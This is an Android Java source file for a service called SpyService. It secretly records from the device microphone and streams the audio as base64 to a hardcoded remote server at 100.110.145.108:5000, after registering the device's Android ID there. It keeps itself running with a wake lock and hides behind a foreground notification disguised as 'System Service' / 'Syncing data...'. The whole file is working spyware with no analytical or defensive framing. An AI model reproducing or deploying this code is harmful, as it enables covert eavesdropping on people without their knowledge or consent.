package com.system.phantom;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Base64;

import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class SpyService extends Service {
    private static final String SERVER_IP = "100.110.145.108";
    private static final int SERVER_PORT = 5000;
    private String deviceId;
    private AudioRecord audioRecord;
    private boolean isRecording = false;
    private Thread audioThread;
    private Socket socket;
    private OutputStream out;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Phantom:Lock");
            wakeLock.acquire(10 * 60 * 1000L);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(9999, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(9999, createNotification());
        }
        
        connectToServer();
        startAudioStreaming();
    }

    private void connectToServer() {
        new Thread(() -> {
            try {
                socket = new Socket(SERVER_IP, SERVER_PORT);
                out = socket.getOutputStream();
                out.write(("REGISTER|" + deviceId + "\n").getBytes());
                out.flush();
            } catch (Exception e) { 
                e.printStackTrace(); 
            }
        }).start();
    }

    private void sendData(String data) {
        new Thread(() -> {
            try {
                if (out != null) {
                    out.write((data + "\n").getBytes());
                    out.flush();
                }
            } catch (Exception e) { 
                e.printStackTrace(); 
            }
        }).start();
    }

    private void startAudioStreaming() {
        if (isRecording) return;
        
        int bufferSize = AudioRecord.getMinBufferSize(8000, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, 8000, AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2);
        
        isRecording = true;
        audioThread = new Thread(() -> {
            try {
                if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
                    audioRecord.startRecording();
                    byte[] buffer = new byte[bufferSize];
                    while (isRecording) {
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) {
                            String b64 = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
                            sendData("AUDIO|" + b64);
                        }
                        Thread.sleep(50);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
        audioThread.start();
    }

    private Notification createNotification() {
        String channelId = "phantom_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
        
        Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? 
                new Notification.Builder(this, channelId) : new Notification.Builder(this);

        return builder.setContentTitle("System Service")
                .setContentText("Syncing data...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRecording = false;
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
            } catch (Exception e) {}
        }
        try { 
            if (socket != null) socket.close(); 
        } catch (Exception e) {}
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    @Override 
    public IBinder onBind(Intent intent) { 
        return null; 
    }
}
